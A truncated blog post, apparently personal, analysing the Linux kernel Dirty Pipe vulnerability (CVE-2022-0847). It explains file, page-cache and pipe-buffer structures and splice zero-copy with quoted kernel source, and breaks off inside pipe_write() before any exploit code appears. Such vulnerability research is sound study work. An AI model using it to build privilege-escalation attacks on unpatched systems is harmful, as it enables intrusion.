<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
<meta name="viewport"
      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
<meta http-equiv="X-UA-Compatible" content="ie=edge">

    <meta name="author" content="7r1p13J">





<title>CVE-2022-0847 ditry-pipe 漏洞分析与利用 | Hexo</title>



    <link rel="icon" href="/github-11-48.ico">




    <!-- stylesheets list from _config.yml -->
    
    <link rel="stylesheet" href="/css/style.css">
    



    <!-- scripts list from _config.yml -->
    
    <script src="/js/script.js"></script>
    
    <script src="/js/tocbot.min.js"></script>
    



    
    
        
    


<meta name="generator" content="Hexo 6.3.0"></head>

<body>
    <script>
        // this function is used to check current theme before page loaded.
        (() => {
            const currentTheme = window.localStorage && window.localStorage.getItem('theme') || '';
            const isDark = currentTheme === 'dark';
            const pagebody = document.getElementsByTagName('body')[0]
            if (isDark) {
                pagebody.classList.add('dark-theme');
                // mobile
                document.getElementById("mobile-toggle-theme").innerText = "· Dark"
            } else {
                pagebody.classList.remove('dark-theme');
                // mobile
                document.getElementById("mobile-toggle-theme").innerText = "· Light"
            }
        })();
    </script>

    <div class="wrapper">
        <header>
    <nav class="navbar">
        <div class="container">
            <div class="navbar-header header-logo"><a href="/">7r1pl3J&#39;s Blog</a></div>
            <div class="menu navbar-right">
                
                    <a class="menu-item" href="/archives">Posts</a>
                
                    <a class="menu-item" href="/category">Categories</a>
                
                    <a class="menu-item" href="/tag">Tags</a>
                
                    <a class="menu-item" href="/about">About</a>
                
                    <a class="menu-item" href="/link">Links</a>
                
                <input id="switch_default" type="checkbox" class="switch_default">
                <label for="switch_default" class="toggleBtn"></label>
            </div>
        </div>
    </nav>

    
    <nav class="navbar-mobile" id="nav-mobile">
        <div class="container">
            <div class="navbar-header">
                <div>
                    <a href="/">7r1pl3J&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
                </div>
                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
            </div>
            <div class="menu" id="mobile-menu">
                
                    <a class="menu-item" href="/archives">Posts</a>
                
                    <a class="menu-item" href="/category">Categories</a>
                
                    <a class="menu-item" href="/tag">Tags</a>
                
                    <a class="menu-item" href="/about">About</a>
                
                    <a class="menu-item" href="/link">Links</a>
                
            </div>
        </div>
    </nav>

</header>
<script>
    var mobileBtn = function f() {
        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
        var mobileMenu = document.getElementById("mobile-menu");
        if(toggleMenu.classList.contains("active")){
           toggleMenu.classList.remove("active")
            mobileMenu.classList.remove("active")
        }else{
            toggleMenu.classList.add("active")
            mobileMenu.classList.add("active")
        }
    }
</script>
            <div class="main">
                <div class="container">
    
    
        <div class="post-toc">
    <div class="tocbot-list">
    </div>
    <div class="tocbot-list-menu">
        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
        <a onclick="go_top()">Back to top</a>
        <a onclick="go_bottom()">Go to bottom</a>
    </div>
</div>

<script>
    var tocbot_timer;
    var DEPTH_MAX = 6; // 为 6 时展开所有
    var tocbot_default_config = {
        tocSelector: '.tocbot-list',
        contentSelector: '.post-content',
        headingSelector: 'h1, h2, h3, h4, h5',
        orderedList: false,
        scrollSmooth: true,
        onClick: extend_click,
    };

    function extend_click() {
        clearTimeout(tocbot_timer);
        tocbot_timer = setTimeout(function() {
            tocbot.refresh(obj_merge(tocbot_default_config, {
                hasInnerContainers: true
            }));
        }, 420); // 这个值是由 tocbot 源码里定义的 scrollSmoothDuration 得来的
    }

    document.ready(function() {
        tocbot.init(obj_merge(tocbot_default_config, {
            collapseDepth: 1
        }));
    });

    function expand_toc() {
        var b = document.querySelector('.tocbot-toc-expand');
        var expanded = b.getAttribute('data-expanded');
        expanded ? b.removeAttribute('data-expanded') : b.setAttribute('data-expanded', true);
        tocbot.refresh(obj_merge(tocbot_default_config, {
            collapseDepth: expanded ? 1 : DEPTH_MAX
        }));
        b.innerText = expanded ? 'Expand all' : 'Collapse all';
    }

    function go_top() {
        window.scrollTo(0, 0);
    }

    function go_bottom() {
        window.scrollTo(0, document.body.scrollHeight);
    }

    function obj_merge(target, source) {
        for (var item in source) {
            if (source.hasOwnProperty(item)) {
                target[item] = source[item];
            }
        }
        return target;
    }
</script>
    

    
    <article class="post-wrap">
        <header class="post-header">
            <h1 class="post-title">CVE-2022-0847 ditry-pipe 漏洞分析与利用</h1>
            
                <div class="post-meta">
                    
                        Author: <a itemprop="author" rel="author" href="/">7r1p13J</a>
                    

                    
                        <span class="post-time">
                        Date: <a href="#">December 17, 2022&nbsp;&nbsp;10:28:05</a>
                        </span>
                    
                    
                        <span class="post-category">
                    Category:
                            
                                <a href="/categories/kernel/">kernel</a>
                            
                        </span>
                    
                </div>
            
        </header>

        <div class="post-content">
            <h1 id="CVE-2022-0847-ditry-pipe-漏洞分析与利用"><a href="#CVE-2022-0847-ditry-pipe-漏洞分析与利用" class="headerlink" title="CVE-2022-0847 ditry-pipe 漏洞分析与利用"></a>CVE-2022-0847 ditry-pipe 漏洞分析与利用</h1><h1 id="在一切开始之前"><a href="#在一切开始之前" class="headerlink" title="在一切开始之前"></a>在一切开始之前</h1><h2 id="file相关"><a href="#file相关" class="headerlink" title="file相关"></a>file相关</h2><p>文件结构体代表一个打开的文件，系统中的每个打开的文件在内核空间都有一个关联的 struct file。它由内核在打开文件时创建，并传递给在文件上进行操作的任何函数。在文件的所有实例都关闭后，内核释放这个数据结构。在内核创建和驱动源码中，struct file的指针通常被命名为file或filp。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">llist_node</span>	<span class="title">fu_llist</span>;</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span> 	<span class="title">fu_rcuhead</span>;</span></span><br><span class="line">	&#125; f_u;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">path</span>		<span class="title">f_path</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">inode</span>		*<span class="title">f_inode</span>;</span>	<span class="comment">/* cached value */</span></span><br><span class="line">	<span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span>	*<span class="title">f_op</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Protects f_ep, f_flags.</span></span><br><span class="line"><span class="comment">	 * Must not be taken from IRQ context.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="type">spinlock_t</span>		f_lock;</span><br><span class="line">	<span class="class"><span class="keyword">enum</span> <span class="title">rw_hint</span>		<span class="title">f_write_hint</span>;</span></span><br><span class="line">	<span class="type">atomic_long_t</span>		f_count;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> 		f_flags;</span><br><span class="line">	<span class="type">fmode_t</span>			f_mode;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">mutex</span>		<span class="title">f_pos_lock</span>;</span></span><br><span class="line">	<span class="type">loff_t</span>			f_pos;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">fown_struct</span>	<span class="title">f_owner</span>;</span></span><br><span class="line">	<span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span>	*<span class="title">f_cred</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">file_ra_state</span>	<span class="title">f_ra</span>;</span></span><br><span class="line"></span><br><span class="line">	u64			f_version;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SECURITY</span></span><br><span class="line">	<span class="type">void</span>			*f_security;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	<span class="comment">/* needed for tty driver, and maybe others */</span></span><br><span class="line">	<span class="type">void</span>			*private_data;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_EPOLL</span></span><br><span class="line">	<span class="comment">/* Used by fs/eventpoll.c to link all the hooks to this file */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">hlist_head</span>	*<span class="title">f_ep</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* #ifdef CONFIG_EPOLL */</span></span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">address_space</span>	*<span class="title">f_mapping</span>;</span></span><br><span class="line">    <span class="comment">//指向属于文件相关的inode实例的地址空间映射，通常它设置为inode-&gt;i_mapping。在读写一个文件时，每次都从物理设备上获取文件的话，速度会很慢，在内核中对每个文件分配一个地址空间，实际上是这个文件的数据缓存区域，在读写文件时只是操作这块缓存，通过内核有相应的同步机制将脏的页写回物理设备。</span></span><br><span class="line"></span><br><span class="line">	<span class="type">errseq_t</span>		f_wb_err;</span><br><span class="line">	<span class="type">errseq_t</span>		f_sb_err; <span class="comment">/* for syncfs */</span></span><br><span class="line">&#125; __randomize_layout</span><br><span class="line">  __attribute__((aligned(<span class="number">4</span>)));	<span class="comment">/* lest something weird decides that 2 is OK */</span></span><br></pre></td></tr></table></figure>

<p><code>f_mapping</code> 字段的类型为 <code>address_space</code> 结构</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">struct address_space &#123;</span><br><span class="line">    struct inode           *host;      /* owner: inode, block_device */</span><br><span class="line">    struct radix_tree_root page_tree;  /* radix tree of all pages */</span><br><span class="line">    rwlock_t               tree_lock;  /* and rwlock protecting it */</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>address_space</code> 结构其中的一个作用就是用于存储文件的 <code>页缓存</code>，下面介绍一下各个字段的作用：</p>
<ul>
<li><code>host</code>：指向当前 <code>address_space</code> 对象所属的文件 <code>inode</code> 对象（每个文件都使用一个 <code>inode</code> 对象表示）。</li>
<li><code>page_tree</code>：用于存储当前文件的 <code>页缓存</code>。</li>
<li><code>tree_lock</code>：用于防止并发访问 <code>page_tree</code> 导致的资源竞争问题。</li>
</ul>
<p>一个比较形象的图</p>
<p><img src="https://blogimg-1314041910.cos.ap-guangzhou.myqcloud.com/81777bb48e9fc3fd96300a66e0509ebb.png" alt="img"></p>
<p> <strong>inode</strong> ，即虚拟文件节点，<strong>VFS inode</strong> 包含文件访问权限、属主、组、大小、生成时间、访问时间、最后修改时间等信息。它是Linux 管理文件系统的最基本单位，也是文件系统连接任何子目录、文件的桥梁。 <strong>内核使用inode结构体在内核内部表示一个文件</strong>。因此，它与表示一个已经打开的文件描述符的<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=%E7%BB%93%E6%9E%84%E4%BD%93&spm=1001.2101.3001.7020">结构体</a>(即file 文件结构)是不同的，我们可以使用多个file 文件结构表示同一个文件的多个文件描述符，但此时，所有的这些file文件结构全部都<strong>必须只能指向一个inode结构体</strong>。</p>
<h2 id="管道相关"><a href="#管道相关" class="headerlink" title="管道相关"></a>管道相关</h2><p>管道是Linux中IPC的常用方法，拥有一个读端和一个写端，两个程序之间可以通过这种方法实现通信。而在内核中，为了实现这种通信，需要维护一个环形缓冲区结构，即pipe_bufffer</p>
<p>具体的，在do_pipe()函数中 最终调用了alloc_pipe_info 来分配这种结构体</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> pipe_inode_info *<span class="title function_">alloc_pipe_info</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span> *<span class="title">pipe</span>;</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> pipe_bufs = PIPE_DEF_BUFFERS;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">user_struct</span> *<span class="title">user</span> =</span> get_current_user();</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> user_bufs;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> max_size = READ_ONCE(pipe_max_size);</span><br><span class="line"></span><br><span class="line">	pipe = kzalloc(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> pipe_inode_info), GFP_KERNEL_ACCOUNT);</span><br><span class="line">    <span class="comment">//分配pipe</span></span><br><span class="line">	<span class="keyword">if</span> (pipe == <span class="literal">NULL</span>)</span><br><span class="line">		<span class="keyword">goto</span> out_free_uid;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (pipe_bufs * PAGE_SIZE &gt; max_size &amp;&amp; !capable(CAP_SYS_RESOURCE))</span><br><span class="line">		pipe_bufs = max_size &gt;&gt; PAGE_SHIFT;</span><br><span class="line"></span><br><span class="line">	user_bufs = account_pipe_buffers(user, <span class="number">0</span>, pipe_bufs);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (too_many_pipe_buffers_soft(user_bufs) &amp;&amp; pipe_is_unprivileged_user()) &#123;</span><br><span class="line">		user_bufs = account_pipe_buffers(user, pipe_bufs, PIPE_MIN_DEF_BUFFERS);</span><br><span class="line">		pipe_bufs = PIPE_MIN_DEF_BUFFERS;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (too_many_pipe_buffers_hard(user_bufs) &amp;&amp; pipe_is_unprivileged_user())</span><br><span class="line">		<span class="keyword">goto</span> out_revert_acct;</span><br><span class="line"></span><br><span class="line">	pipe-&gt;bufs = kcalloc(pipe_bufs, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> pipe_buffer),</span><br><span class="line">			     GFP_KERNEL_ACCOUNT);</span><br><span class="line">    <span class="comment">//分配pipe buf</span></span><br><span class="line">    <span class="keyword">if</span> (pipe-&gt;bufs) &#123;</span><br><span class="line">		init_waitqueue_head(&amp;pipe-&gt;rd_wait);</span><br><span class="line">		init_waitqueue_head(&amp;pipe-&gt;wr_wait);</span><br><span class="line">		pipe-&gt;r_counter = pipe-&gt;w_counter = <span class="number">1</span>;</span><br><span class="line">		pipe-&gt;max_usage = pipe_bufs;</span><br><span class="line">		pipe-&gt;ring_size = pipe_bufs;</span><br><span class="line">		pipe-&gt;nr_accounted = pipe_bufs;</span><br><span class="line">		pipe-&gt;user = user;</span><br><span class="line">		mutex_init(&amp;pipe-&gt;mutex);</span><br><span class="line">		<span class="keyword">return</span> pipe;</span><br><span class="line">	&#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> PIPE_DEF_BUFFERS	16</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> offset, len;</span><br><span class="line">	<span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> *<span class="title">ops</span>;</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> flags;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> private;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">mutex</span>;</span></span><br><span class="line">	<span class="type">wait_queue_head_t</span> rd_wait, wr_wait;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> head;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> tail;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> max_usage;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> ring_size;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_WATCH_QUEUE</span></span><br><span class="line">	<span class="type">bool</span> note_loss;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> nr_accounted;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> readers;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> writers;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> files;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> r_counter;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> w_counter;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> poll_usage;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">tmp_page</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">fasync_struct</span> *<span class="title">fasync_readers</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">fasync_struct</span> *<span class="title">fasync_writers</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">bufs</span>;</span> <span class="comment">//pipe buffer 数组</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">user_struct</span> *<span class="title">user</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_WATCH_QUEUE</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">watch_queue</span> *<span class="title">watch_queue</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>也就是说pipe 由 pipe_inode_info 结构体管理着16个pipe_buffer结构体，每个pipe_buffer结构体指向一个缓冲页，事实上，这还是一个环形的缓冲区，由head 和tail 两个指针来维护。</p>
<p><img src="https://blogimg-1314041910.cos.ap-guangzhou.myqcloud.com/1-pipe_buffer.png" alt="1-pipe_buffer"></p>
<h2 id="零拷贝"><a href="#零拷贝" class="headerlink" title="零拷贝"></a>零拷贝</h2><p>以socket读写为例，传统IO的执行流往往是这样</p>
<p><img src="https://blogimg-1314041910.cos.ap-guangzhou.myqcloud.com/32d2fc554b9e0070d975c5ae62033d1b.png" alt="img"></p>
<p>有两次非常多余的上下文切换操作</p>
<p>Linux 在 2.6.17 版本引入 splice 系统调用，不仅不需要硬件支持，还实现了两个文件描述符之间的数据零拷贝。splice 的伪代码如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">splice(fd_in, off_in, fd_out, off_out, len, flags);</span><br></pre></td></tr></table></figure>

<p>splice 系统调用可以在内核空间的读缓冲区（read buffer）和网络缓冲区（socket buffer）之间建立管道（pipeline），从而避免了两者之间的 CPU 拷贝操作。</p>
<p><img src="https://blogimg-1314041910.cos.ap-guangzhou.myqcloud.com/v2-37cf7a8b129183c24c7b524d3fee1a29_720w.webp" alt="img"></p>
<p>基于 splice 系统调用的零拷贝方式，整个拷贝过程会发生 2 次上下文切换，0 次 CPU 拷贝以及 2 次 DMA 拷贝，用户程序读写数据的流程如下：</p>
<ol>
<li>用户进程通过 splice() 函数向内核（kernel）发起系统调用，上下文从用户态（user space）切换为内核态（kernel space）。</li>
<li>CPU 利用 DMA 控制器将数据从主存或硬盘拷贝到内核空间（kernel space）的读缓冲区（read buffer）。</li>
<li>CPU 在内核空间的读缓冲区（read buffer）和网络缓冲区（socket buffer）之间建立管道（pipeline）。</li>
<li>CPU 利用 DMA 控制器将数据从网络缓冲区（socket buffer）拷贝到网卡进行数据传输。</li>
<li>上下文从内核态（kernel space）切换回用户态（user space），splice 系统调用执行返回。</li>
</ol>
<p>splice 拷贝方式也同样存在用户程序不能对数据进行修改的问题。除此之外，它使用了 Linux 的管道缓冲机制，可以用于任意两个文件描述符中传输数据，但是它的两个文件描述符参数中有一个必须是管道设备。</p>
<blockquote>
<p>为什么是0次cpu拷贝呢，其实就是两个设备共用了同一个缓冲区，具体来讲，就是pipe_buffer所对应的page 直接指向了写文件的 page cache，这样管道读的话就是直接从page cache 读了，没有cpu拷贝操作。</p>
</blockquote>
<h1 id="函数流程分析"><a href="#函数流程分析" class="headerlink" title="函数流程分析"></a>函数流程分析</h1><h2 id="pipe-write"><a href="#pipe-write" class="headerlink" title="pipe_write()"></a>pipe_write()</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">ssize_t</span></span><br><span class="line"><span class="title function_">pipe_write</span><span class="params">(<span class="keyword">struct</span> kiocb *iocb, <span class="keyword">struct</span> iov_iter *from)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">filp</span> =</span> iocb-&gt;ki_filp;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span> *<span class="title">pipe</span> =</span> filp-&gt;private_data;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> head;</span><br><span class="line">	<span class="type">ssize_t</span> ret = <span class="number">0</span>;</span><br><span class="line">	<span class="type">size_t</span> total_len = iov_iter_count(from);</span><br><span class="line">	<span class="type">ssize_t</span> chars;</span><br><span class="line">	<span class="type">bool</span> was_empty = <span class="literal">false</span>;</span><br><span class="line">	<span class="type">bool</span> wake_next_writer = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Null write succeeds. */</span></span><br><span class="line">	<span class="keyword">if</span> (unlikely(total_len == <span class="number">0</span>))</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	__pipe_lock(pipe);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!pipe-&gt;readers) &#123;</span><br><span class="line">		send_sig(SIGPIPE, current, <span class="number">0</span>);</span><br><span class="line">		ret = -EPIPE;</span><br><span class="line">		<span class="keyword">goto</span> out;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_WATCH_QUEUE</span></span><br><span class="line">	<span class="keyword">if</span> (pipe-&gt;watch_queue) &#123;</span><br><span class="line">		ret = -EXDEV;</span><br><span class="line">		<span class="keyword">goto</span> out;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * If it wasn&#x27;t empty we try to merge new data into</span></span><br><span class="line"><span class="comment">	 * the last buffer.</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * That naturally merges small writes, but it also</span></span><br><span class="line"><span class="comment">	 * page-aligns the rest of the writes for large writes</span></span><br><span class="line"><span class="comment">	 * spanning multiple pages.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	head = pipe-&gt;head;</span><br><span class="line">	was_empty = pipe_empty(head, pipe-&gt;tail);</span><br><span class="line">	chars = total_len &amp; (PAGE_SIZE<span class="number">-1</span>);</span><br><span class="line">    <span class="comment">//此处相当于除以一页，chars为余数</span></span><br><span class="line">    </span><br><span 